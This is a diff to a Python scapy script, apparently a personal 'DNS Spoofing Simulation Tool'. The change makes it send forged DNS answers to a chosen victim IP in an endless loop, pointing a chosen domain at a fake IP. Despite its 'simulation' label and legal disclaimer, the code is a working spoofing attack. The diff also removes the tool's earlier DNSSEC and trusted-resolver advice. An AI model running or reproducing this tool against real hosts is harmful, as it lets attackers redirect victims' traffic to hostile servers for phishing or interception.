@@ -1,25 +1,40 @@
 from scapy.all import *
 import time
 import random
+import signal
+import sys
+
+# Function to handle CTRL+C gracefully
+def signal_handler(sig, frame):
+    print("\n[!] Stopping the DNS Spoofing Simulation...")
+    sys.exit(0)
+
+# Register the signal handler
+signal.signal(signal.SIGINT, signal_handler)
 
 def dns_spoof(victim_ip, dns_server_ip, domain, fake_ip):
     """
-    Simulates DNS Spoofing attack by sending a forged DNS response.
-    victim_ip: Victim's IP address
-    dns_server_ip: DNS resolver's IP
-    domain: The domain to spoof (e.g., www.example.com)
-    fake_ip: The fake IP to redirect to
+    Simulates DNS Spoofing attack by continuously sending forged DNS responses.
     """
-    # Craft a DNS response with a fake IP
-    dns_response = IP(dst=victim_ip)/UDP(dport=53)/DNS(id=random.randint(1, 65535), qr=1, 
-                                                  qd=DNSQR(qname=domain, qtype="A"), 
-                                                  an=DNSRR(rrname=domain, ttl=10, rdata=fake_ip))
-    
-    # Send the fake DNS response to the victim
-    send(dns_response, verbose=0)
-    
-    # Print what the victim is spoofed to (to verify)
-    print(f"DNS Spoofed! {domain} is now pointing to {fake_ip} for victim {victim_ip}")
+    print("\n[*] DNS Spoofing attack started. Press CTRL+C to stop.")
+    try:
+        while True:
+            # Craft a DNS response with a fake IP
+            dns_response = IP(dst=victim_ip)/UDP(dport=53)/DNS(id=random.randint(1, 65535), qr=1, 
+                                                      qd=DNSQR(qname=domain, qtype="A"), 
+                                                      an=DNSRR(rrname=domain, ttl=10, rdata=fake_ip))
+            
+            # Send the fake DNS response to the victim
+            send(dns_response, verbose=0)
+            
+            # Print status update
+            print(f"[*] Spoofed {domain} -> {fake_ip} for victim {victim_ip}")
+
+            # Sleep to avoid excessive flooding (adjust as needed)
+            time.sleep(2)
+
+    except Exception as e:
+        print(f"[!] Error during spoofing: {e}")
 
 def main():
     # Display disclaimer
@@ -29,7 +44,8 @@ def main():
     print("Any illegal use of this tool is the sole responsibility of the user.")
     print("===================================")
     print("\nTool developed by: Sujal Lamichhane\n")
-    time.sleep(2)  # Wait for a few seconds before continuing
+    time.sleep(2)
+
     print("Proceeding with the DNS Spoofing Simulation Tool...\n")
     time.sleep(2)
 
@@ -39,17 +55,16 @@ def main():
     domain = input("Enter Domain to Spoof (e.g., www.example.com): ")
     fake_ip = input("Enter Fake IP Address to Redirect to (e.g., 192.168.1.100): ")
 
-    print("\nSimulating DNS Spoofing Attack...\n")
-    time.sleep(1)
+    # Check for empty inputs and handle errors
+    if not victim_ip or not dns_server_ip or not domain or not fake_ip:
+        print("[!] Error: All fields must be filled. Please try again.")
+        return
 
     # Simulate DNS Spoofing Attack
     dns_spoof(victim_ip, dns_server_ip, domain, fake_ip)
 
-    print("\nDNS Spoofing Attack simulation complete!")
-    print(f"\nWhen {victim_ip} tries to access {domain}, it will be redirected to {fake_ip}.\n")
-    print("Recommendations: ")
-    print("- Enable DNSSEC to secure DNS responses.")
-    print("- Use trusted DNS resolvers.")
-    
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except Exception as e:
+        print(f"[!] An unexpected error occurred: {e}")
